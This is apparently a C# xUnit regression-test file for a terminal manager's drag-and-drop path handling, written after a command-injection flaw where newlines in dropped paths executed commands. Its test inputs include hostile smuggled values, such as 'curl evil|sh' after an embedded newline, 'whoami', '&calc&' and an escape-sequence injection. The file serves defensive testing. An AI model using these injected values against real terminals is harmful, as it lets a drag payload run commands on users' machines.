using CodeShellManager.Terminal;
using Xunit;

namespace CodeShellManager.Tests;

/// <summary>
/// Regression tests for the drag-and-drop injection found in the v0.8.0 pre-release review.
///
/// The page builds these paths from the drag payload's text/uri-list via decodeURIComponent,
/// so `file:///C:/x%0Acurl%20evil%7Csh%0A` arrives as a string containing newlines — and the
/// host wrote them straight to the PTY. A newline written to a PTY is Enter, so a single drop
/// from a source that controls the drag payload executed a command in the focused session.
/// </summary>
public class DroppedPathsTests
{
    [Theory]
    [InlineData("C:\\x\ncurl evil|sh\n")]
    [InlineData("C:\\x\rwhoami\r")]
    [InlineData("C:\\x\u0000y")]
    [InlineData("C:\\x\u001b]0;title\u0007")]   // OSC injection via a "filename"
    [InlineData("\n")]
    public void PathsContainingControlCharactersAreDropped(string hostile)
    {
        Assert.Equal("", TerminalBridge.BuildDroppedPathsPayload(new[] { hostile }));
    }

    [Fact]
    public void AHostilePathDoesNotTakeTheGoodOnesWithIt()
    {
        string payload = TerminalBridge.BuildDroppedPathsPayload(new[]
        {
            @"C:\ok\one.txt",
            "C:\\evil\nid",
            @"C:\ok\two.txt",
        });

        Assert.Equal(@"C:\ok\one.txt C:\ok\two.txt", payload);
    }

    [Theory]
    [InlineData(@"C:\Users\alice\file.txt", @"C:\Users\alice\file.txt")]
    [InlineData(@"C:\Program Files\a.txt", "\"C:\\Program Files\\a.txt\"")]
    public void OrdinaryPathsAreUnchangedOrQuotedForSpaces(string input, string expected)
    {
        Assert.Equal(expected, TerminalBridge.BuildDroppedPathsPayload(new[] { input }));
    }

    [Fact]
    public void AQuoteInAPathIsRejected()
    {
        // `"` is legal in a URI-derived string even though Win32 forbids it in a filename.
        // There is no escaping that is simultaneously correct for cmd.exe, PowerShell and
        // POSIX shells — and the pane could be running any of them — so it is rejected.
        // Escaping it as \" was cmd-wrong: cmd ends the quoted region there, leaving the
        // rest of the payload bare.
        Assert.Equal("", TerminalBridge.BuildDroppedPathsPayload(new[] { "C:\\a\"b c" }));
        Assert.Equal("", TerminalBridge.BuildDroppedPathsPayload(new[] { "x\"&calc&\".txt" }));
    }

    [Theory]
    [InlineData(@"C:\tmp\a&calc.txt")]      // legal filename; cmd would run calc unquoted
    [InlineData(@"C:\tmp\a;b.txt")]
    [InlineData(@"C:\tmp\a|b.txt")]
    [InlineData(@"C:\tmp\(x).txt")]
    [InlineData(@"C:\tmp\a$b.txt")]
    [InlineData(@"C:\tmp\a`b.txt")]
    public void ShellMetacharactersForceQuoting(string path)
    {
        // Quoting only on space was POSIX-shaped thinking. Sessions are commonly cmd.exe or
        // PowerShell, where `&`, `;`, `|`, `(` and friends are syntax in an unquoted word.
        string payload = TerminalBridge.BuildDroppedPathsPayload(new[] { path });

        Assert.Equal("\"" + path + "\"", payload);
    }

    [Fact]
    public void MultiplePathsAreSpaceSeparated()
    {
        Assert.Equal(@"C:\a C:\b",
            TerminalBridge.BuildDroppedPathsPayload(new[] { @"C:\a", @"C:\b" }));
    }

    [Fact]
    public void EmptyInputProducesNothingToWrite()
    {
        Assert.Equal("", TerminalBridge.BuildDroppedPathsPayload(new string[0]));
        Assert.Equal("", TerminalBridge.BuildDroppedPathsPayload(new[] { "", "" }));
    }

    [Fact]
    public void BidiAndFormatCharactersAreRejected()
    {
        // char.IsControl misses Unicode category Cf. U+202E (RIGHT-TO-LEFT OVERRIDE)
        // reverses how the rest of the path renders, so the user reads one thing and
        // presses Enter on another. Note these paths contain NO C0/C1 control character —
        // otherwise the test would pass for the wrong reason.
        Assert.Equal("", TerminalBridge.BuildDroppedPathsPayload(
            new[] { "C:\\tmp\\a\u202Ecxe.txt" }));
        Assert.Equal("", TerminalBridge.BuildDroppedPathsPayload(
            new[] { "C:\\tmp\\a\u200Bb.txt" }));   // zero-width space
    }

    [Fact]
    public void ThePathListIsBounded()
    {
        // The page controls this array; a drag payload advertising thousands of URIs would
        // otherwise be typed into the session in a single write.
        var many = new string[500];
        for (int i = 0; i < many.Length; i++) many[i] = $"C:\\tmp\\f{i}.txt";

        string payload = TerminalBridge.BuildDroppedPathsPayload(many);

        Assert.Equal(64, payload.Split(' ').Length);
        Assert.StartsWith(@"C:\tmp\f0.txt ", payload);
    }

    [Fact]
    public void AbsurdlyLongPathsAreSkipped()
    {
        string huge = @"C:\tmp\" + new string('x', 5000);

        Assert.Equal("", TerminalBridge.BuildDroppedPathsPayload(new[] { huge }));
    }
}
